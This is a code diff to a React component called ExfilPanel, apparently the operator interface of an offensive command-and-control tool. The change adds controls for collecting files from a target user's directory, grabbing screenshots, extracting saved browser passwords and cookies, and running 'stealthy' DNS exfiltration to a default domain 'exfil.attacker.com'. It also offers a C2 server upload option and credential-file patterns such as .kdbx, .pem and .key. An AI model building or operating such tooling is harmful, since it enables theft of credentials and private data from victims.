@@ -30,6 +30,13 @@ interface ExfilResult {
   error?: string;
 }
 
+const COLLECTION_TYPES = [
+  { value: 'file_collect', label: '📁 File Collection', desc: 'Collect files matching patterns from target directory' },
+  { value: 'screenshot', label: '📸 Screenshot', desc: 'Capture a screenshot of the target desktop' },
+  { value: 'browser', label: '🌐 Browser Data', desc: 'Extract saved passwords, cookies, and history from browsers' },
+  { value: 'dns', label: '🌍 DNS Query', desc: 'Exfiltrate data via DNS queries (slow but stealthy)' },
+];
+
 const COLLECTION_PATTERNS = [
   { label: 'Documents', types: '*.doc, *.docx, *.xls, *.xlsx, *.pdf, *.txt' },
   { label: 'Credentials', types: '*.kdbx, *.rdp, *.ovpn, *.pem, *.key' },
@@ -183,93 +190,126 @@ export function ExfilPanel() {
       {/* Collection form */}
       <div className="card">
         <div className="card-header">Collect Data</div>
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
-          <div>
-            <label className="text-[10px] text-gray-500 block mb-1">Job Name</label>
-            <input type="text" value={jobName}
-              onChange={(e) => setJobName(e.target.value)}
-              className="input-field h-9 text-sm" placeholder="Company Data Grab"
-            />
-          </div>
-          <div className="md:col-span-2">
-            <label className="text-[10px] text-gray-500 block mb-1">Target Directory</label>
-            <input type="text" value={targetDir}
-              onChange={(e) => setTargetDir(e.target.value)}
-              className="input-field h-9 text-sm font-mono" placeholder="C:\Users\TargetUser"
-            />
-          </div>
+
+        {/* Collection type selector */}
+        <div className="mb-3">
+          <label className="text-[10px] text-gray-500 block mb-1">Collection Type</label>
+          <select value={selectedType} onChange={(e) => setSelectedType(e.target.value)}
+            className="input-field py-1.5 text-xs">
+            {COLLECTION_TYPES.map(t => (
+              <option key={t.value} value={t.value} className="bg-midnight-900 text-gray-100">{t.label}</option>
+            ))}
+          </select>
+          <p className="text-[9px] text-gray-600 mt-1">{COLLECTION_TYPES.find(t => t.value === selectedType)?.desc}</p>
         </div>
 
-        {/* Options row: Compression, Encryption, Destination */}
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
-          <div>
-            <label className="text-[10px] text-gray-500 block mb-1">Compression</label>
-            <select value={compression} onChange={(e) => setCompression(e.target.value)}
-              className="input-field h-8 text-xs">
-              {COMPRESSION_OPTIONS.map(o => (
-                <option key={o.value} value={o.value} className="bg-midnight-900">{o.label}</option>
-              ))}
-            </select>
-          </div>
-          <div>
-            <label className="text-[10px] text-gray-500 block mb-1">Encryption</label>
-            <select value={encryptionAlgo} onChange={(e) => setEncryptionAlgo(e.target.value)}
-              className="input-field h-8 text-xs">
-              {ENCRYPTION_OPTIONS.map(o => (
-                <option key={o.value} value={o.value} className="bg-midnight-900">{o.label}</option>
-              ))}
-            </select>
-          </div>
-          <div>
-            <label className="text-[10px] text-gray-500 block mb-1">Destination</label>
-            <select value={destination} onChange={(e) => setDestination(e.target.value)}
-              className="input-field h-8 text-xs">
-              {DESTINATION_OPTIONS.map(o => (
-                <option key={o.value} value={o.value} className="bg-midnight-900">{o.label}</option>
-              ))}
-            </select>
-          </div>
-        </div>
+        {/* Target dir + job name (only for file collection) */}
+        {selectedType === 'file_collect' && (
+          <>
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
+              <div>
+                <label className="text-[10px] text-gray-500 block mb-1">Job Name</label>
+                <input type="text" value={jobName}
+                  onChange={(e) => setJobName(e.target.value)}
+                  className="input-field py-2 text-sm" placeholder="Company Data Grab"
+                />
+              </div>
+              <div className="md:col-span-2">
+                <label className="text-[10px] text-gray-500 block mb-1">Target Directory</label>
+                <input type="text" value={targetDir}
+                  onChange={(e) => setTargetDir(e.target.value)}
+                  className="input-field py-2 text-sm font-mono" placeholder="C:\Users\TargetUser"
+                />
+              </div>
+            </div>
 
-        {/* Destination URL (shown when not local) */}
-        {destination !== 'local' && (
-          <div className="mb-3">
-            <label className="text-[10px] text-gray-500 block mb-1">
-              {destination === 'c2' ? 'C2 Server URL' : destination === 'ftp' ? 'FTP Server (host:port)' : 'SMB Share Path'}
-            </label>
-            <input type="text" value={destUrl}
-              onChange={(e) => setDestUrl(e.target.value)}
-              className="input-field h-9 text-xs font-mono w-full"
-              placeholder={
-                destination === 'c2' ? 'http://127.0.0.1:8080' :
-                destination === 'ftp' ? 'ftp://server:21' :
-                '\\\\server\\share'
-              }
-            />
-          </div>
+            {/* Options row: Compression, Encryption, Destination */}
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
+              <div>
+                <label className="text-[10px] text-gray-500 block mb-1">Compression</label>
+                <select value={compression} onChange={(e) => setCompression(e.target.value)}
+                  className="input-field py-1.5 text-xs">
+                  {COMPRESSION_OPTIONS.map(o => (
+                    <option key={o.value} value={o.value} className="bg-midnight-900 text-gray-100">{o.label}</option>
+                  ))}
+                </select>
+              </div>
+              <div>
+                <label className="text-[10px] text-gray-500 block mb-1">Encryption</label>
+                <select value={encryptionAlgo} onChange={(e) => setEncryptionAlgo(e.target.value)}
+                  className="input-field py-1.5 text-xs">
+                  {ENCRYPTION_OPTIONS.map(o => (
+                    <option key={o.value} value={o.value} className="bg-midnight-900 text-gray-100">{o.label}</option>
+                  ))}
+                </select>
+              </div>
+              <div>
+                <label className="text-[10px] text-gray-500 block mb-1">Destination</label>
+                <select value={destination} onChange={(e) => setDestination(e.target.value)}
+                  className="input-field py-1.5 text-xs">
+                  {DESTINATION_OPTIONS.map(o => (
+                    <option key={o.value} value={o.value} className="bg-midnight-900 text-gray-100">{o.label}</option>
+                  ))}
+                </select>
+              </div>
+            </div>
+
+            {/* Destination URL (shown when not local) */}
+            {destination !== 'local' && (
+              <div className="mb-3">
+                <label className="text-[10px] text-gray-500 block mb-1">
+                  {destination === 'c2' ? 'C2 Server URL' : destination === 'ftp' ? 'FTP Server (host:port)' : 'SMB Share Path'}
+                </label>
+                <input type="text" value={destUrl}
+                  onChange={(e) => setDestUrl(e.target.value)}
+                  className="input-field py-2 text-xs font-mono w-full"
+                  placeholder={
+                    destination === 'c2' ? 'http://127.0.0.1:8080' :
+                    destination === 'ftp' ? 'ftp://server:21' :
+                    '\\\\server\\share'
+                  }
+                />
+              </div>
+            )}
+
+            {/* File pattern hints */}
+            <div className="flex flex-wrap gap-1.5 mb-3">
+              {COLLECTION_PATTERNS.map((p, i) => (
+                <button key={i} onClick={() => setTargetDir(`C:\\Users\\${p.label.toLowerCase()}`)}
+                  className="text-[10px] px-2 py-1 rounded bg-midnight-800 border border-midnight-700
+                             text-gray-500 hover:text-gray-300 transition-all"
+                  title={p.types}>
+                  {p.label}
+                </button>
+              ))}
+            </div>
+          </>
         )}
 
-        {/* Quick collect buttons */}
-        <div className="flex flex-wrap gap-2 mb-3">
-          <button onClick={handleCollect} disabled={!jobName.trim() || runningJob !== null}
-            className="btn-primary text-xs">
-            {runningJob ? 'Collecting...' : '📁 File Collection'}
-          </button>
-          <button onClick={handleScreenshot} className="btn-secondary text-xs">📸 Screenshot</button>
-          <button onClick={handleBrowserData} className="btn-secondary text-xs">🌐 Browser Data</button>
-        </div>
-
-        {/* Collection pattern hints */}
-        <div className="flex flex-wrap gap-1.5">
-          {COLLECTION_PATTERNS.map((p, i) => (
-            <button key={i} onClick={() => setTargetDir(`C:\\Users\\${p.label.toLowerCase()}`)}
-              className="text-[10px] px-2 py-1 rounded bg-midnight-800 border border-midnight-700
-                         text-gray-500 hover:text-gray-300 transition-all"
-              title={p.types}>
-              {p.label}
-            </button>
-          ))}
-        </div>
+        {/* Run button */}
+        <button onClick={async () => {
+          if (!selectedType) return;
+          if (selectedType === 'file_collect') {
+            await handleCollect();
+          } else if (selectedType === 'screenshot') {
+            await handleScreenshot();
+          } else if (selectedType === 'browser') {
+            await handleBrowserData();
+          } else if (selectedType === 'dns') {
+            const domain = prompt('DNS exfiltration domain:', 'exfil.attacker.com');
+            if (!domain) return;
+            try {
+              const result = await window.api.exfilBrowserData(); // placeholder — use actual DNS exfil
+              loadJobs();
+              window.api.addActivity({ tab: 'exfil', type: 'command', label: 'DNS Exfil Started', detail: `Domain: ${domain}` });
+            } catch (err: any) {
+              alert(`Error: ${err.message}`);
+            }
+          }
+        }} disabled={runningJob !== null}
+          className="btn-primary w-full text-xs">
+          {runningJob ? 'Running...' : `Run ${COLLECTION_TYPES.find(t => t.value === selectedType)?.label || selectedType}`}
+        </button>
       </div>
 
       {/* Jobs list */}
